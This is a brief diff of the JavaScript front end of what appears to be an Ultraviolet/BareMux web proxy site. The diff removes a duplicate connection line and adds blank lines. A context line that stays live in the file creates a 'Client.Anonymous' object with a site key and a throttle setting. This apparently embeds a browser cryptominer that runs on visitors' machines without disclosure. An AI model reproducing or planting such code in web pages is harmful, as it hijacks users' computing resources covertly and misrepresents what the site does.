@@ -20,7 +20,6 @@ const error = document.getElementById("uv-error");
  */
 const errorCode = document.getElementById("uv-error-code");
 const connection = new BareMux.BareMuxConnection("/baremux/worker.js");
-const connection = new BareMux.BareMuxConnection("/M7d1.js");
 var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
     throttle: 0.4, c: 'w', ads: 0
 });
@@ -181,6 +180,7 @@ await ensureBareTransport(connection, wispUrl);
         submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
     });
 });
+
 
 
 
